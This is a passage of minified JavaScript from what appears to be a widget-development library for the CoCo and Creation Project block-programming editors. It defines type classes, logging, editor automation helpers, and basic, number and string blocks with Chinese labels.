t,n;if(null!=e.value.subTypes)throw new Error("无法将事件的子类型转为 Creation Project 类型");const o=null!==(n=null!==(t=e.value.deprecated)&&void 0!==t?t:e.blockOptions.deprecated)&&void 0!==n&&n;r.emits.push({key:e.value.key,label:0!=o?`[已弃用] ${e.value.label}`:e.value.label,params:e.value.params.map(e=>Object.assign({key:e.key,label:e.label},e.type.toCreationProjectEmitParamValueTypes()))})},BlockBoxOptions(e){null!=e.value.space&&(a=e.value.space),null!=e.value.line&&(l=e.value.line)}}),r}function ue(e){return/^https:\/\/cp\.cocotais\.cn\/(#|\?.*)?$/.test(e.location.href)}function ce(){if(ue(window))return window;try{if(parent!=window&&ue(parent))return parent}catch(e){}try{if(opener instanceof Window&&ue(opener))return opener}catch(e){}return null}function pe(){var e,t,n,r;return null!==(r=null===(n=null===(t=null===(e=ye())||void 0===e?void 0:e.parentElement)||void 0===t?void 0:t.querySelector('input[type="text"]'))||void 0===n?void 0:n.value)&&void 0!==r?r:null}function ye(){var e,t,n;return null!==(n=Array.from(null!==(t=null===(e=ce())||void 0===e?void 0:e.document.querySelectorAll("button"))&&void 0!==t?t:[]).find(e=>{var t;return/^[\s]*(运[\s]*行|停[\s]*止)[\s]*$/.test(null!==(t=e.textContent)&&void 0!==t?t:"")}))&&void 0!==n?n:null}function fe(){var e,t;return/^[\s]*停[\s]*止[\s]*$/.test(null!==(t=null===(e=ye())||void 0===e?void 0:e.textContent)&&void 0!==t?t:"")}const Dn={getSuperWidget(e){const t=new Set;return function e(n){for(const r of n)"contents"in r?e(r.contents):t.add(Array.isArray(r)?r[0]:r.key)}(e.properties),class extends In{constructor(){return super(),new Proxy(this,{defineProperty:(e,n,r)=>"string"==typeof n&&t.has(n)?Reflect.defineProperty(e.props,n,r):Reflect.defineProperty(e,n,r),deleteProperty:(e,n)=>"string"==typeof n&&t.has(n)?Reflect.deleteProperty(e.props,n):Reflect.deleteProperty(e,n),get:(e,n,r)=>"string"==typeof n&&t.has(n)?Reflect.get(e.props,n,r):Reflect.get(e,n,r),getOwnPropertyDescriptor:(e,n)=>"string"==typeof n&&t.has(n)?Reflect.getOwnPropertyDescriptor(e.props,n):Reflect.getOwnPropertyDescriptor(e,n),has:(e,n)=>"string"==typeof n&&t.has(n)?Reflect.has(e.props,n):Reflect.has(e,n),ownKeys:e=>Reflect.ownKeys(e).concat(Reflect.ownKeys(e.props)),set:(n,r,o,l)=>"string"==typeof r&&t.has(r)?e.options.visible?(In.prototype.setProp.call(l,r,o),!0):Reflect.set(n.props,r,o,l):Reflect.set(n,r,o,l)})}}},exportWidget(e,t,n){[e,t]=ne(e,t,n,"CreationProject"),function(e,t){Rn.type=e,Rn.widget=t}(...function(e,t){return[se(e),t]}(e,t))},Logger:class{constructor(e,t){this.widget=t}log(e){In.prototype.widgetLog.call(this.widget,e)}info(e){In.prototype.widgetLog.call(this.widget,`[信息] ${e}`)}warn(e){In.prototype.widgetWarn.call(this.widget,e)}error(e){In.prototype.widgetError.call(this.widget,e)}},emit(e,...t){In.prototype.emit.call(this,e,...t)},utils:{inNative(){var e,t;return null!==(t=null===(e=xn("cp_utils"))||void 0===e?void 0:e.native)&&void 0!==t&&t},inEditor(){var e,t;return!(null===(t=null===(e=xn("cp_utils"))||void 0===e?void 0:e.player)||void 0===t||t)},inEditorWindow:function(){return/^https:\/\/cp\.cocotais\.cn\/(pptui)?$/.test(location.href)},inEditorPlayer:function(){return/^https:\/\/cp\.cocotais\.cn\/player(#|\?.*)?$/.test(location.href)},getImageURLByFileName(e){var t,n;return null!==(n=null===(t=xn("cp_utils"))||void 0===t?void 0:t.resToUrl.img(e))&&void 0!==n?n:null},getAudioURLByFileName(e){var t,n;return null!==(n=null===(t=xn("cp_utils"))||void 0===t?void 0:t.resToUrl.audio(e))&&void 0!==n?n:null},getVideoURLByFileName(e){var t,n;return null!==(n=null===(t=xn("cp_utils"))||void 0===t?void 0:t.resToUrl.video(e))&&void 0!==n?n:null},editor:{getWindow:ce,getWorkName:pe,getRunButton:ye,isRunningWork:fe,runWork(){var e;fe()||null===(e=ye())||void 0===e||e.click()},stopWork(){var e;fe()&&(null===(e=ye())||void 0===e||e.click())},saveWork:()=>new Promise((e,t)=>{var n;const r=ce();if(null==r)return void t(new Error("找不到编辑器窗口"));const o=Array.from(null!==(n=r.document.querySelectorAll("button"))&&void 0!==n?n:[]).find(e=>{var t;return/^[\s]*保[\s]*存[\s]*$/.test(null!==(t=e.textContent)&&void 0!==t?t:"")});if(null==o)return void t(new Error("找不到保存按钮"));o.click();const l=setInterval(()=>{1==o.children.length&&(e(),clearInterval(l))},100)}),reopenWork(){const e=pe();if(null==e)throw new Error("找不到作品名称");const t=ce();if(null==t)throw new Error("找不到编辑器窗口");const n=t.document.querySelector('[data-menu-id="open_cloud"]');if(null==n)throw new Error("找不到打开按钮");n.click();const r=setInterval(()=>{var n;const o=Array.from(null!==(n=t.document.querySelectorAll(".ant-card"))&&void 0!==n?n:[]).find(t=>{var n;return(null===(n=t.querySelector(".ant-card-meta-title"))||void 0===n?void 0:n.textContent)==e});null!=o&&(o.click(),clearInterval(r))},100)},importWidget:e=>new Promise((t,n)=>{if("string"==typeof e&&(e=new Blob([e],{type:"text/javascript"})),e instanceof Blob&&(e=new File([e],"widget.js",{type:"text/javascript"})),!(e instanceof File))return void n(new Error("参数错误，widget 必须是 File 或 Blob 或字符串"));const r=e,o=ce();if(null==o)throw new Error("找不到编辑器窗口");const l=o.document.querySelector('[data-menu-id="import_extension"]');if(null==l)return void n(new Error("找不到自定义控件导入按钮"));const a=o.document.createElement;o.document.createElement=function(e,n){const l=a.call(this,e,n);return l instanceof HTMLInputElement&&(l.addEventListener("click",e=>{e.preventDefault()}),o.document.createElement=a,setTimeout(()=>{const e=new DataTransfer;e.items.add(r),l.files=e.files,l.dispatchEvent(new Event("change",{bubbles:!0})),setTimeout(()=>{t()},150)},0)),l},l.click()})}}};class Bn{constructor(e={}){var t;"object"!=typeof e&&(e={defaultValue:e}),this.defaultValue=null!==(t=e.defaultValue)&&void 0!==t?t:""}validate(e){return!0}getSameDirectionChildren(){return[]}getReverseDirectionChildren(){return[]}isVoid(){return!1}typeToString(){return"任意"}inlineTypeToString(){return this.typeToString()}toCoCoPropertyValueTypes(){return{valueType:["string","number","boolean","array","object"],defaultValue:V("string"==typeof this.defaultValue?this.defaultValue:JSON.stringify(this.defaultValue))}}toCoCoMethodParamValueTypes(){return{valueType:["string","number","boolean","array","object"],defaultValue:V("string"==typeof this.defaultValue?this.defaultValue:JSON.stringify(this.defaultValue))}}toCoCoMethodValueTypes(){return{valueType:["string","number","boolean","array","object"]}}toCoCoEventParamValueTypes(){return{valueType:["string","number","boolean","array","object"]}}toCreationProjectPropValueTypes(){return{valueType:"string",defaultValue:this.defaultValue}}toCreationProjectMethodParamValueTypes(){return{valueType:"string",defaultValue:this.defaultValue}}toCreationProjectMethodValueTypes(){return{valueType:"string"}}toCreationProjectEmitParamValueTypes(){return{valueType:"string"}}}class Wn{constructor(...e){var t;this.types=e;for(const t of e)if("defaultValue"in t&&("string"==typeof t.defaultValue||"number"==typeof t.defaultValue||"boolean"==typeof t.defaultValue)){this.defaultValue=t.defaultValue;break}null!==(t=this.defaultValue)&&void 0!==t||(this.defaultValue="")}validate(e){const t=[];for(const n of this.types)try{return C(null,e,n),!0}catch(e){if(!(e instanceof pn))throw e;t.push(e)}throw new pn(`不能将 ${O(e)} 分配给 ${E(this)}\n`+t.map(e=>e.message.split("\n").map(e=>`　${e}`).join("\n")).join("\n"),e,this)}getSameDirectionChildren(){var e,t,n;const r=[];for(let o=0;o<this.types.length;o++){const l=this.types[o];null!=l&&r.push({key:`__slightning_coco_widget_union_type_child__${o}_${null!==(n=null===(t=null===(e=Object.getPrototypeOf(l))||void 0===e?void 0:e.constructor)||void 0===t?void 0:t.name)&&void 0!==n?n:"unknown"}`,label:String(o),type:l})}return r}getReverseDirectionChildren(){return[]}isVoid(){return this.types.every(e=>e.isVoid())}typeToStringPrepare(e,t){for(const n of this.types)(new He).prepare(n,e,t)}typeToString(e,t){return 0==this.types.length?"空":`(${this.types.map(n=>(new He).toString(n,e,t)).join(" | ")})`}inlineTypeToStringPrepare(e,t){this.typeToStringPrepare(e,t)}inlineTypeToString(e,t){return this.typeToString(e,t)}toCoCoPropertyValueTypes(){const e=[];for(const t of this.types){const{valueType:n}=t.toCoCoMethodValueTypes();Array.isArray(n)?e.push(...n):null!=n&&e.push(n)}return{valueType:e,defaultValue:this.defaultValue}}toCoCoMethodParamValueTypes(){const e=[];for(const t of this.types){const{valueType:n}=t.toCoCoMethodValueTypes();Array.isArray(n)?e.push(...n):null!=n&&e.push(n)}return{valueType:e,defaultValue:this.defaultValue}}toCoCoMethodValueTypes(){const e=[];for(const t of this.types){const{valueType:n}=t.toCoCoMethodValueTypes();Array.isArray(n)?e.push(...n):null!=n&&e.push(n)}return{valueType:e}}toCoCoEventParamValueTypes(){const e=[];for(const t of this.types){const{valueType:n}=t.toCoCoMethodValueTypes();Array.isArray(n)?e.push(...n):null!=n&&e.push(n)}return{valueType:e}}toCreationProjectPropValueTypes(){throw new Error(`不能将 ${E(this)} 转为 Creation Project 属性类型`)}toCreationProjectMethodParamValueTypes(){return{valueType:"any",defaultValue:this.defaultValue}}toCreationProjectMethodValueTypes(){return{valueType:"any"}}toCreationProjectEmitParamValueTypes(){return{valueType:"any"}}}function be(e){return n().getSuperWidget(e)}class Fn{constructor(e){var t;"function"==typeof e&&(e={theClass:e}),this.theClass=e.theClass,this.defaultValue=null!==(t=e.defaultValue)&&void 0!==t?t:`实例<${e.theClass.name}>`}validate(e){if(!(e instanceof this.theClass))throw new pn(`不能将 ${O(e)} 分配给 ${E(this)}`,e,this);return!0}getSameDirectionChildren(){return[]}getReverseDirectionChildren(){return[]}isVoid(){return!1}typeToString(){return`实例<${this.theClass.name}>`}inlineTypeToString(){return this.typeToString()}toCoCoPropertyValueTypes(){return{valueType:["string","object"],checkType:"string",defaultValue:V(this.defaultValue)}}toCoCoMethodParamValueTypes(){return{valueType:["string","object"],checkType:"string",defaultValue:V(this.defaultValue)}}toCoCoMethodValueTypes(){return{valueType:"object"}}toCoCoEventParamValueTypes(){return{valueType:"object"}}toCreationProjectPropValueTypes(){return{valueType:"object",defaultValue:this.defaultValue}}toCreationProjectMethodParamValueTypes(){return{valueType:"object",defaultValue:this.defaultValue}}toCreationProjectMethodValueTypes(){return{valueType:"object"}}toCreationProjectEmitParamValueTypes(){return{valueType:"object"}}}const Hn=React;var de=e.n(Hn);class qn{constructor(e,t){this.types=e,this.adapter=new(n().Logger)(e,t)}log(...e){this.outputLog({messages:e,editor:this.adapter.log.bind(this.adapter),browser:e.some(e=>["function","object"].includes(typeof e))?console.log:null})}info(...e){this.outputLog({messages:e,editor:this.adapter.info.bind(this.adapter),browser:console.info})}warn(...e){this.outputLog({messages:e,editor:this.adapter.warn.bind(this.adapter),browser:console.warn})}error(...e){this.outputLog({messages:e,editor:this.adapter.error.bind(this.adapter),browser:console.error})}outputLog({messages:e,editor:t,browser:n}){if(null!=t)for(const n of function(e){let t=e.split("\n");if(t.length>1){t[0]=`┼　${t[0]}`;for(let e=1;e<t.length;e++)t[e]=`│　${t[e]}`}return t}(e.map(e=>"string"==typeof e?e:O(e)).join(" ")))t(n);null==n||n(`[自定义控件 ${this.types.info.title}]`,...e)}}if(void 0!==In&&"function"==typeof xn&&null!=xn("cp_utils"))r(Dn);else{if(void 0===Le||void 0===De)throw"undefined"!=new Function("return typeof global")()&&"undefined"!=new Function("return typeof process")()?new Error("暂不支持在 Node 中运行"):new Error(`未知的平台：${location.href}`);r(An)}const Un={rE:"0.0.2"},Jn={key:"basic__nullOrUndefined",label:"基础空或未定义",block:[{key:"type",label:"类型",type:new wn([["未定义","Undefined"],["空","Null"]])}],returns:new Bn,tooltip:"获取空或未定义。"},Gn={basic__nullOrUndefined(e){switch(e){case"Null":return null;case"Undefined":return}}},Xn=new wn(["字符串","数字","大整数","布尔","符号","未定义","空","列表","字典","集合","日期","函数","未知"]),Yn={key:"basic__typeof",label:"基础获取类型",block:[{key:"value",label:"值",type:new Bn("值")},"的类型"],returns:Xn,tooltip:"获取用字符串表示的数据类型，可能的值有：\n- 字符串；\n- 数字；\n- 大整数；\n- 布尔；\n- 符号；\n- 未定义；\n- 空；\n- 列表；\n- 字典；\n- 集合；\n- 日期；\n- 函数；\n- 未知。"},Kn={basic__typeof(e){switch(typeof e){case"string":return"字符串";case"number":return"数字";case"bigint":return"大整数";case"boolean":return"布尔";case"symbol":return"符号";case"undefined":return"未定义";case"object":return null==e?"空":Array.isArray(e)?"列表":e instanceof Date?"日期":e instanceof Set?"集合":Object.getPrototypeOf(e)==Object.prototype?"字典":"未知";case"function":return"函数";default:return"未知"}}},Zn={key:"algorithm",label:"算法",type:new wn([["等于","equal"],["不等于","notEqual"],["同值于","sameValue"],["不同值于","notSameValue"],["同0同值于","sameValueZero"],["同0不同值于","notSameValueZero"]])},zn={equal:(e,t)=>e==t,notEqual:(e,t)=>!zn.equal(e,t),sameValue:(e,t)=>!(!Number.isNaN(e)||!Number.isNaN(t))||Object.is(e,t),notSameValue:(e,t)=>!zn.sameValue(e,t),sameValueZero:(e,t)=>!(!Number.isNaN(e)||!Number.isNaN(t))||e==t,notSameValueZero:(e,t)=>!zn.sameValueZero(e,t)},Qn={key:"number__equal",label:"数字等于",block:[{key:"x",label:"X",type:new hn},Zn,{key:"y",label:"Y",type:new hn}],returns:new gn},er={number__equal:(e,t,n)=>zn[t](e,n)},tr={key:"algorithm",label:"算法",type:new wn([["严格等于","IsStrictlyEqual"],["严格不等于","IsNotStrictlyEqual"],["宽松等于","IsLooselyEqual"],["宽松不等于","IsNotLooselyEqual"],["同0同值于","SameValueZero"],["同0不同值于","NotSameValueZero"],["同值于","SameValue"],["不同值于","NotSameValue"]])},nr={IsStrictlyEqual:(e,t)=>e===t,IsNotStrictlyEqual:(e,t)=>!nr.IsStrictlyEqual(e,t),IsLooselyEqual:(e,t)=>e==t,IsNotLooselyEqual:(e,t)=>!nr.IsLooselyEqual(e,t),SameValueZero:(e,t)=>"number"==typeof e&&"number"==typeof t?zn.sameValueZero(e,t):e===t,NotSameValueZero:(e,t)=>!nr.SameValueZero(e,t),SameValue:(e,t)=>Object.is(e,t),NotSameValue:(e,t)=>!nr.SameValue(e,t)},rr={key:"basic__equal",label:"基础等于",block:[{key:"x",label:"X",type:new Bn("X")},tr,{key:"y",label:"Y",type:new Bn("Y")}],returns:new gn,tooltip:"使用指定算法判断两个值是否相等，可选的比较算法有：\n- 严格等于：https://tc39.es/ecma262/multipage/abstract-operations.html#sec-isstrictlyequal\n- 宽松等于：https://tc39.es/ecma262/multipage/abstract-operations.html#sec-islooselyequal\n- 同0同值于：https://tc39.es/ecma262/multipage/abstract-operations.html#sec-samevaluezero\n- 同值于：https://tc39.es/ecma262/multipage/abstract-operations.html#sec-samevalue。"},or={basic__equal:(e,t,n)=>nr[t](e,n)};async function he(e,t,n){if(await n(e,t))return!0;if(null!=e&&"object"==typeof e&&null!=t&&"object"==typeof t){const r=[],o=[];for(const n in e){if(!(n in t))return!1;r.push(n)}for(const n in t)if(!(n in e))return!1;for(const l of r)o.push(he(e[l],t[l],n));return new Promise(e=>{Promise.all(o.map(async t=>{await t||e(!1)})).then(()=>{e(!0)})})}return!1}const lr={key:"basic__deepEqualWith",label:"基础深度等于以",block:[{key:"x",label:"X",type:new Bn("X")},"深度",{key:"type",label:"类型",type:new wn([["等于","Equal"],["不等于","NotEqual"]])},{key:"y",label:"Y",type:new Bn("Y")},"以",{key:"comparer",label:"比较器",type:new mn({block:[{key:"x",label:"X",type:new Bn("X")},{key:"y",label:"Y",type:new Bn("Y")}],returns:new gn(!0)})}],returns:new gn,tooltip:"使用自定义比较器深度比较两个值是否相等。与 基础深度等于 方法不同的是，该方法接收一个自定义比较器来定制比较方式。"},ar={async basic__deepEqualWith(e,t,n,r){switch(t){case"Equal":return he(e,n,r);case"NotEqual":return!await he(e,n,r)}}},ir={key:"basic__deepEqual",label:"基础深度等于",block:[{key:"x",label:"X",type:new Bn("X")},"深度",{key:"type",label:"类型",type:new wn([["等于","Equal"],["不等于","NotEqual"]])},{key:"y",label:"Y",type:new Bn("Y")}],returns:new gn,tooltip:"深度比较两个值是否相等。与 基础等于 方法不同的是，该方法会递归比较列表和字典类型的值。对于其他类型的值，使用 同0同值于 算法进行比较。"},sr={async basic__deepEqual(e,t,n){switch(t){case"Equal":return he(e,n,nr.SameValueZero);case"NotEqual":return!await he(e,n,nr.SameValueZero)}}},ur=-1,cr=0,pr=1,yr=2,fr=3,br=4,dr=5,hr=6,gr=7,wr=8,vr="object"==typeof self?self:globalThis,_r=(e,t)=>{const n=(t,n)=>(e.set(n,t),t),r=o=>{if(e.has(o))return e.get(o);const[l,a]=t[o];switch(l){case cr:case ur:return n(a,o);case pr:{const e=n([],o);for(const t of a)e.push(r(t));return e}case yr:{const e=n({},o);for(const[t,n]of a)e[r(t)]=r(n);return e}case fr:return n(new Date(a),o);case br:{const{source:e,flags:t}=a;return n(new RegExp(e,t),o)}case dr:{const e=n(new Map,o);for(const[t,n]of a)e.set(r(t),r(n));return e}case hr:{const e=n(new Set,o);for(const t of a)e.add(r(t));return e}case gr:{const{name:e,message:t}=a;return n(new vr[e](t),o)}case wr:return n(BigInt(a),o);case"BigInt":return n(Object(BigInt(a)),o);case"ArrayBuffer":return n(new Uint8Array(a).buffer,a);case"DataView":{const{buffer:e}=new Uint8Array(a);return n(new DataView(e),a)}}return n(new vr[l](a),o)};return r},mr=e=>_r(new Map,e)(0),kr="",{toString:Tr}={},{keys:Sr}=Object,Vr=e=>{const t=typeof e;if("object"!==t||!e)return[cr,t];const n=Tr.call(e).slice(8,-1);switch(n){case"Array":return[pr,kr];case"Object":return[yr,kr];case"Date":return[fr,kr];case"RegExp":return[br,kr];case"Map":return[dr,kr];case"Set":return[hr,kr];case"DataView":return[pr,n]}return n.includes("Array")?[pr,n]:n.includes("Error")?[gr,n]:[yr,n]},jr=([e,t])=>e===cr&&("function"===t||"symbol"===t),Or=(e,t,n,r)=>{const o=(e,t)=>{const o=r.push(e)-1;return n.set(t,o),o},l=r=>{if(n.has(r))return n.get(r);let[a,i]=Vr(r);switch(a){case cr:{let t=r;switch(i){case"bigint":a=wr,t=r.toString();break;case"function":case"symbol":if(e)throw new TypeError("unable to serialize "+i);t=null;break;case"undefined":return o([ur],r)}return o([a,t],r)}case pr:{if(i){let e=r;return"DataView"===i?e=new Uint8Array(r.buffer):"ArrayBuffer"===i&&(e=new Uint8Array(r)),o([i,[...e]],r)}const e=[],t=o([a,e],r);for(const t of r)e.push(l(t));return t}case yr:{if(i)switch(i){case"BigInt":return o([i,r.toString()],r);case"Boolean":case"Number":case"String":return o([i,r.valueOf()],r)}if(t&&"toJSON"in r)return l(r.toJSON());const n=[],s=o([a,n],r);for(const t of Sr(r))!e&&jr(Vr(r[t]))||n.push([l(t),l(r[t])]);return s}case fr:return o([a,r.toISOString()],r);case br:{const{source:e,flags:t}=r;return o([a,{source:e,flags:t}],r)}case dr:{const t=[],n=o([a,t],r);for(const[n,o]of r)(e||!jr(Vr(n))&&!jr(Vr(o)))&&t.push([l(n),l(o)]);return n}case hr:{const t=[],n=o([a,t],r);for(const n of r)!e&&jr(Vr(n))||t.push(l(n));return n}}const{message:s}=r;return o([a,{name:i,message:s}],r)};return l},Cr=(e,{json:t,lossy:n}={})=>{const r=[];return Or(!(t||n),!!t,new Map,r)(e),r},Er="function"==typeof structuredClone?(e,t)=>t&&("json"in t||"lossy"in t)?mr(Cr(e,t)):structuredClone(e):(e,t)=>mr(Cr(e,t)),$r={key:"basic__copy",label:"基础复制",block:["复制",{key:"data",label:"数据",type:new Bn("数据")}],returns:new Bn},Pr={basic__copy(t){var n;return(null!==(n=e.g.structuredClone)&&void 0!==n?n:Er)(t)}};var ge;const Mr=null!==(ge=e.g.structuredClone)&&void 0!==ge?ge:Er;function we(e){let t=null;for(const{value:n}of e)if(Array.isArray(t)&&Array.isArray(n))t=t.concat(n);else if(null!=t&&"object"==typeof t&&null!=n&&"object"==typeof n)for(const[e,r]of Object.entries(n))e in t&&"object"==typeof t[e]?t[e]=we([{value:t[e]},{value:r}]):t[e]=r;else t=Mr(n);return t}const Nr={key:"basic__deepMergeInline_v1",label:"基础深度合并单行",block:["深度合并",{key:"data",label:"数据",type:new Sn({block:[{key:"value",label:"值",type:new Bn("数据")}],min:2,transformMax:5})}],returns:new Bn},Ar={basic__deepMergeInline_v1:we},xr={key:"basic__deepMergeMultiline_v1",label:"基础深度合并多行",block:["深度合并",{key:"data",label:"数据",type:new Sn({block:[A.BREAK_LINE,{key:"value",label:"值",type:new Bn("数据")}],min:2,transformMax:5})}],returns:new Bn,blockOptions:{inline:!1}},Ir={basic__deepMergeMultiline_v1:we},Rr={key:"basic__JSONStringify",label:"基础 JSON 字符化",block:["JSON","字符化",{key:"data",label:"数据",type:new Bn("数据")}],returns:new dn},Lr={basic__JSONStringify:e=>JSON.stringify(e)},Dr={key:"basic__JSONParse",label:"基础 JSON 解析",block:["JSON","解析",{key:"JSONString",label:"JSON 字符串",type:new dn('["JSON 字符串"]')}],returns:new Bn},Br={basic__JSONParse:e=>JSON.parse(e)},Wr={label:"基础",blockOptions:{color:x.CYAN},contents:[{contents:[Jn,Yn]},{contents:[rr,ir,lr]},{contents:[$r,Nr,xr]},{contents:[Rr,Dr]}]},Fr=Object.assign({},Gn,Kn,or,sr,ar,Pr,Ar,Ir,Lr,Br),Hr={key:"number__literal",label:"数字字面",block:[{key:"value",label:"值",type:new hn(0)}],returns:new hn},qr={number__literal:e=>e},Ur={key:"number__spacial",label:"数字特殊",block:[{key:"name",label:"名称",type:new wn([["非数字","NaN"],["无穷大","Infinity"],["最大安全整数","MAX_SAFE_INTEGER"],["最小安全整数","MIN_SAFE_INTEGER"],["最大数","MAX_VALUE"],["最小数","MIN_VALUE"]])}],returns:new hn},Jr={number__spacial(e){switch(e){case"NaN":return NaN;case"Infinity":return 1/0;case"MAX_SAFE_INTEGER":return Number.MAX_SAFE_INTEGER;case"MIN_SAFE_INTEGER":return Number.MIN_SAFE_INTEGER;case"MAX_VALUE":return Number.MAX_VALUE;case"MIN_VALUE":return Number.MIN_VALUE}}},Gr={key:"number__is",label:"数字是",block:[{key:"number",label:"数子",type:new hn(0)},"是",{key:"type",label:"类型",type:new wn([["整数","Integer"],["非数字","NaN"],["有限的","Finite"],["安全整数","SafeInteger"]])}],returns:new gn},Xr={number__is(e,t){switch(t){case"Integer":return Number.isInteger(e);case"NaN":return Number.isNaN(e);case"Finite":return Number.isFinite(e);case"SafeInteger":return Number.isSafeInteger(e)}}},Yr={key:"number__binaryBitwiseOperation",label:"数字二元位运算",block:[{key:"x",label:"X",type:new hn(0)},{key:"operationName",label:"操作名称",type:new wn([["&","And"],["|","Or"],["^","Xor"]])},{key:"y",label:"Y",type:new hn(0)}],returns:new hn},Kr={number__binaryBitwiseOperation(e,t,n){switch(t){case"And":return e&n;case"Or":return e|n;case"Xor":return e^n}}},Zr={key:"number__UnaryBitwiseOperation",label:"数字一元位运算",block:[{key:"operationName",label:"操作名称",type:new wn([["~","Not"]])},{key:"x",label:"X",type:new hn(0)}],returns:new hn},zr={number__UnaryBitwiseOperation(e,t){if("Not"===e)return~t}},Qr={key:"number__shiftOperation",label:"数字移位运算",block:[{key:"x",label:"X",type:new hn(0)},{key:"operationName",label:"操作名称",type:new wn([["<<","LeftShift"],[">>","RightShift"],[">>>","UnsignedRightShift"]])},{key:"y",label:"Y",type:new hn(0)}],returns:new hn},eo={number__shiftOperation(e,t,n){switch(t){case"LeftShift":return e<<n;case"RightShift":return e>>n;case"UnsignedRightShift":return e>>>n}}},to={key:"number__mathFunction",label:"数字函数",block:[{key:"functionName",label:"函数名称",type:new wn(["sin","cos","tan","asin","acos","atan","sinh","cosh","tanh","asinh","acosh","atanh"])},{key:"x",label:"X",type:new hn(0)}],returns:new hn},no={number__mathFunction:(e,t)=>Math[e](t)},ro={key:"number__atan2",label:"数字反正切2",block:["atan2",{key:"y",label:"Y",type:new hn(0)},{key:"x",label:"X",type:new hn(0)}],returns:new hn},oo={number__atan2:(e,t)=>Math.atan2(e,t)},lo=new wn([["最小值","Min"],["最大值","Max"]]);function ve(e,t){const n=t.map(({number:e})=>e);switch(e){case"Min":return Math.min(...n);case"Max":return Math.max(...n)}}const ao={key:"number__minAndMaxInline",label:"数字最小和最大单行",block:[{key:"type",label:"类型",type:lo},{key:"numbers",label:"数字",type:new Sn({block:[{key:"number",label:"数字",type:new hn(0)}],transformMax:5})}],returns:new hn},io={number__minAndMaxInline:ve},so={key:"number__minAndMaxMultiline",label:"数字最小和最大多行",block:[{key:"type",label:"类型",type:lo},{key:"numbers",label:"数字",type:new Sn({block:[A.BREAK_LINE,{key:"number",label:"数字",type:new hn(0)}],min:2,transformMax:5})}],returns:new hn,blockOptions:{inline:!1}},uo={number__minAndMaxMultiline:ve},co={key:"number__arrayMinAndMax",label:"数字列表最小和最大",block:[{key:"type",label:"类型",type:new wn([["最小值","Min"],["最大值","Max"]])},{key:"numbers",label:"数字",type:new kn({itemType:new hn(0),defaultValue:[0,1,2,3]})}],returns:new hn},po={number__arrayMinAndMax(e,t){switch(e){case"Min":return Math.min(...t);case"Max":return Math.max(...t)}}},yo={label:"数字",blockOptions:{color:x.RED},contents:[{contents:[Hr,Ur]},{contents:[Gr,Qn]},{contents:[Yr,Zr,Qr,to,ro]},{contents:[ao,so,co]}]},fo=Object.assign({},qr,Jr,Xr,er,Kr,zr,eo,no,oo,io,uo,po),bo={key:"string__literalInline",label:"字符串单行字面",block:[{key:"value",label:"值",type:new dn("字符串")}],returns:new dn},ho={string__literalInline:e=>e},go={key:"string__literalMultiline",label:"字符串多行字面",block:[{key:"value",label:"值",type:new dn({defaultValue:"多行\n字符串",inputType:P.MULTILINE})}],returns:new dn},wo={string__literalMultiline:e=>e},vo=new wn([["换行符","NewLine"],["制表符","Tab"],["回车符","CarriageReturn"],["换页符","PageBreak"]]),_o={key:"string__controlCharacter",label:"字符串控制字符",block:[{key:"controlCharacterName",label:"控制字符",type:vo}],returns:vo},mo={string__controlCharacter(e){switch(e){case"NewLine":return"\n";case"Tab":return"\t";case"CarriageReturn":return"\r";case"PageBreak":return"\f"}}},ko=new wn([["正数","FromFirst"],["倒数","FromLast"]]);function _e(e,t,n){switch(t){case"FromFirst":return e-1;case"FromLast":return n-e}}const To={key:"string__at",label:"字符串索引",block:[{key:"string",label:"字符串",type:new dn("字符串")},{key:"indexType",label:"索引类型",type:ko},"第",{key:"index",label:"索引",type:new Ln(1)},"个字符"],returns:new dn},So={string__at(e,t,n){const r=e[_e(n,t,e.length)];if(null==r)throw new Error("不存在");return r}},Vo={key:"string__charCodeAt",label:"字符串字符编码",block:[{key:"string",label:"字符串",type:new dn("字符串")},{key:"indexType",label:"索引类型",type:ko},"第",{key:"index",label:"索引",type:new Ln(1)},"个字符的编码"],returns:new Ln,tooltip:"获取字符串中指定位置的字符的 Unicode 编码值。"},jo={string__charCodeAt(e,t,n){const r=_e(n,t,e.length);return e.charCodeAt(r)}},Oo={key:"string__with",label:"字符串起始和终止",block:[{key:"string",label:"字符串",type:new dn("字符串")},{key:"withType",label:"类型",type:new wn([{label:"起始",value:"Starts"},{label:"结束",value:"Ends"}])},"于",{key:"search",label:"字符",type:new dn({defaultValue:"字符"})}],returns:new gn,tooltip:"判断给定字符串是否以指定字符开头或结尾。"},Co={string__with(e,t,n){switch(t){case"Starts":return e.startsWith(n);case"Ends":return e.endsWith(n)}}},Eo={key:"string__test",label:"字符串测试",block:[{key:"string",label:"字符串",type:new dn("字符串")},"满足",{key:"pattern",label:"模式",type:new dn("^字.*串$")}],returns:new gn},$o={string__test:(e,t)=>new RegExp(t).test(e)},Po={key:"string__slice",label:"字符串截取",block:[{key:"string",label:"字符串",type:new dn("字符串")},{key:"startIndexType",label:"起始位置",type:ko},"第",{key:"startIndex",label:"索引",type:new Ln(1)},"到",{key:"endIndexType",label:"结束位置",type:ko},"第",{key:"endIndex",label:"索引",type:new Ln(1)},"个字符"],returns:new dn},Mo={string__slice:(e,t,n,r,o)=>e.slice(_e(n,t,e.length),_e(o,r,e.length)+1)};const No={key:"string__replaceAll",label:"字符串替换全部",block:["替换",{key:"string",label:"字符串",type:new dn("字符串")},"中的所有",{key:"search",label:"查找值",type:new dn("字符")},"为",{key:"replace",label:"替换值",type:new dn("字")}],returns:new dn},Ao={string__replaceAll:(e,t,n)=>null!=e.replaceAll?e.replaceAll(t,n):function(e,t,n,r={}){if("string"!=typeof e)throw new TypeError("Expected input to be a string, got "+typeof e);if(!("string"==typeof t&&t.length>0)||"string"!=typeof n&&"function"!=typeof n)return e;let o="",l=0,a=r.fromIndex>0?r.fromIndex:0;if(a>e.length)return e;for(;;){const i=r.caseInsensitive?e.toLowerCase().indexOf(t.toLowerCase(),a):e.indexOf(t,a);if(-1===i)break;l++;const s="string"==typeof n?n:n(e.slice(i,i+t.length),l,e,i),u=1===l?0:a;o+=e.slice(u,i)+s,a=i+t.length}return 0===l?e:o+e.slice(a)}(e,t,n)},xo={key:"string__regExpReplace",label:"字符串正则替换",block:[{key:"string",label:"字符串",type:new dn("字符串")},"正则替换",{key:"pattern",label:"模式",type:new dn("^字.*串$")},{key:"flags",label:"标记",type:new dn("g")},"为",{key:"replace",label:"替换",type:new dn("字")}],returns:new dn},Io={string__regExpReplace:(e,t,n,r)=>e.replace(new RegExp(t,n),r)},Ro={key:"string__match",label:"字符串匹配",block:[{key:"string",label:"字符串",type:new 